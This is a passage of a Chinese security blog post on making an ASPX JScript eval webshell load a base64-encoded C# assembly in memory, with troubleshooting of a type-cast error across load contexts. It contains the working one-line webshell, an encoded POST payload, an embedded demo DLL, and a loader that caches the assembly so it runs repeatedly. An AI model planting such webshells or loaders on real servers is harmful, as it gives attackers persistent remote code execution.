+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>可以证实我们的猜想是成功的，可以用Jscript调用System.Reflection.Assembly.Load执行C#的payload。</p>
+<p>由于蚁剑的aspx一句话是基于jscript的eval的，所以还要通过一层eval给他传进去。</p>
+<p>web项目中新建base.aspx</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;&lt;%eval(Request.Item[&#34;ant&#34;],&#34;unsafe&#34;);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>POST:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ant=var%20Payload%20%3D%22xxxxxxxxx%22%3B%0Avar%20myAssebly%20%3D%20System.Reflection.Assembly.Load(Convert.FromBase64String(Payload))%3B%0Avar%20myPaylaod%3DmyAssebly.CreateInstance(%22AntPayload.Run%22).Equals(this)%3B%0AmyPaylaod.Equals(this)%3B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现第一次是可以正常调用的</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>但是第二次执行就会提示下面的错误</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[A]AntPayload.Run 无法强制转换为 [B]AntPayload.Run。类型 A 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。类型 B 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>搜了一下发现没有什么有用的回答，猜测大概是跟java中类重复加载一样的报错。</p>
+<p>所以就加了一层判断，如果当前存在 AntPayload.Run 这个类型的assembly就不重复进行加载。</p>
+<p>新建项目test0.aspx测试一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &lt;%@ Page Language=&#34;Jscript&#34; Debug=true%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl"> var Payload=&#34;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAP2QD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAMicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOAmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACoJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAOAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAEgAAAACAAUAaCAAAEAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACACAAAjU3RyaW5ncwAAAABYBAAAFAAAACNVUwBsBAAAEAAAACNHVUlEAAAAfAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8A0gEGAEwB0gEGACwAoAEPAPIBAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAAswEGAB4AswEGAIYAhAEGABACfQEKAAgCoAEAAAAAAQAAAAAAAQABAAEAEACWARMAPQABAAEAUCAAAAAAxgABAikAAQBeIAAAAACGGJoBBgACAAAAAQBqAQkAmgEBABEAmgEGABkAmgEKACkAmgEQADEAmgEQADkAmgEQAEEAmgEQAEkAmgEQAFEAmgEQAFkAmgEQAGEAmgEVAGkAmgEQAHEAmgEQAIEAFwIaAHkAmgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AUnVuAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBFcXVhbHMAUHJvY2VzcwBPYmplY3QAU3RhcnQAAAAAABFjAGEAbABjAC4AZQB4AGUAAAA945IL3EDlTKxPqJUA/SMAAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFAAESQQ4It3pcVhk04IkEIAECHAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAPAQAKQW50UGF5bG9hZAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyMQAAKQEAJDUzMTY4RUI2LThBMTgtNDAzRS1CQzQ2LUJGNTY1RkRBMUFFNgAADAEABzEuMC4wLjAAAAAAAAD9kA9gAAAAAAIAAAAcAQAAxCUAAMQHAABSU0RTOaWA97zcx0qN4uxJUEp93wEAAABEOlxSaWRlclByb2plY3RzXERsbFRlc3RcQW50UGF5bG9hZFxvYmpcUmVsZWFzZVxBbnRQYXlsb2FkLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgnAAAAAAAAAAAAACInAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAsAwAAAAAAAAAAAAAsAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEjAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAaAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAD4ACwABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABBAG4AdABQAGEAeQBsAG8AYQBkAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA+AA8AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEEAbgB0AFAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgAxAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBuAHQAUABhAHkAbABvAGEAZAAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbgB0AFAAYQB5AGwAbwBhAGQAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAADQ3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==&#34;; 
+</span></span><span class="line"><span class="cl">    var type = Type.GetType(&#34;AntPayload.Run&#34;);
+</span></span><span class="line"><span class="cl">    if (type != null)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        Response.Write(type + &#34; exists&#34;);
+</span></span><span class="line"><span class="cl">        //var obj=System.Activator.CreateInstance(type);
+</span></span><span class="line"><span class="cl">        //obj.Equals(&#34;&#34;);
+</span></span><span class="line"><span class="cl">        var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+</span></span><span class="line"><span class="cl">        var obj = assembly.CreateInstance(&#34;AntPayload.Run&#34;);
+</span></span><span class="line"><span class="cl">        obj.Equals(&#34;&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    else
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        Response.Write(type + &#34; not exists&#34;);
+</span></span><span class="line"><span class="cl">        var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+</span></span><span class="line"><span class="cl">        var myPaylaod = myAssebly.CreateInstance(&#34;AntPayload.Run&#34;);
+</span></span><span class="line"><span class="cl">        myPaylaod.Equals(&#34;&#34;);
+</span></span><span class="line"><span class="cl">        //myAssebly.GetType(&#34;AntPayload.Run&#34;).GetConstructor(new Type[0]).Invoke(null).Equals(&#34;&#34;);
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现 Type.GetType 永远为undefined。以为是函数用的不对，后来又换了System.Reflection.Assembly.GetCallingAssembly().GetType，System.Reflection.Assembly.GetExecutingAssembly().GetType都不行。</p>
+<p>接着发现虽然把代码直接写在jscript中可以多次稳定触发，如果把以上代码通过eval打进入仍然会报上面类型转换的错误。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>另外还发现一些奇怪的地方，如果直接代码写在jscript文件中可以用这种写法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">        var obj=System.Activator.CreateInstance(type);
+</span></span><span class="line"><span class="cl">        obj.Equals(&#34;&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是如果通过eval传进去就只能用这种写法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">        var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+</span></span><span class="line"><span class="cl">        var obj = assembly.CreateInstance(&#34;AntPayload.Run&#34;);
+</span></span><span class="line"><span class="cl">        obj.Equals(&#34;&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>否则会报如下错误，谷歌也没查到怎么解决，神秘。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<h2 id="问题解决" class="headerLink">
+    <a href="#%e9%97%ae%e9%a2%98%e8%a7%a3%e5%86%b3" class="header-mark"></a>4 问题解决</h2><p>试了很多办法都失败了，后来谷歌搜到了一篇<a href="https://evolpin.wordpress.com/2012/11/11/invalidcastexception-when-using-assembly-loadfile/" target="_blank" rel="noopener noreferrer">2012年的博客</a>遇到了同样的问题，大概意思是说两次的assembly被加载到了不同的上下文中，所以被当作成为不同的类，无法进行类型转换。</p>
+<p>跟北辰师傅研究了一番后，北辰师傅想到一种方法：把第一次加载后的assembly的引用给存到当前Application的上下文中，即HttpContext.Current.Application这个类里面，然后再通过Application.Get(&ldquo;ant&rdquo;)拿到引用，然后反射，再获取实例化，这样就可以解决上下文不同的问题。</p>
+<p>payload修改如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var Payload=&#34;xxxxx&#34;;
+</span></span><span class="line"><span class="cl">HttpContext.Current.Application.Add(&#34;ant&#34;, System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)));
+</span></span><span class="line"><span class="cl">HttpContext.Current.Application.Get(&#34;ant&#34;).GetType(&#34;AntPayload.Run&#34;).GetConstructor(new Type[0]).Invoke(null).Equals(this);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后通过eval打过去，此时就可以多次稳定触发payload了。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>5 最后</h2><p>特别感谢北辰师傅的交流探讨！</p>
+<p>初学.net，有些地方是凭借自己的理解写的，如果有说的不对的地方欢迎指出，以免误导他人。</p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-01-27</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/jscript-load-csharp-assembly/" data-title="Jscript加载Assembly踩坑记"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/jscript-load-csharp-assembly/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/jscript-load-csharp-assembly/" data-title="Jscript加载Assembly踩坑记"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/jscript-load-csharp-assembly/" data-title="Jscript加载Assembly踩坑记"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/jscript-load-csharp-assembly/" data-title="Jscript加载Assembly踩坑记"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/jscript-load-csharp-assembly/" data-title="Jscript加载Assembly踩坑记" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;Jscript加载Assembly踩坑记&#34;, &#34;https://yzddmr6.com/posts/jscript-load-csharp-assembly/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/jsp-webshell-upload-bypass/" class="prev" rel="prev" title="星球问答：一次jsp上传绕过的思考"><i class="fas fa-angle-left fa-fw"></i>星球问答：一次jsp上传绕过的思考</a>
+            <a href="/posts/make-usb-great-again/" class="next" rel="next" title="金士顿 DTSE9G2 128G U盘量产踩坑记">金士顿 DTSE9G2 128G U盘量产踩坑记<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
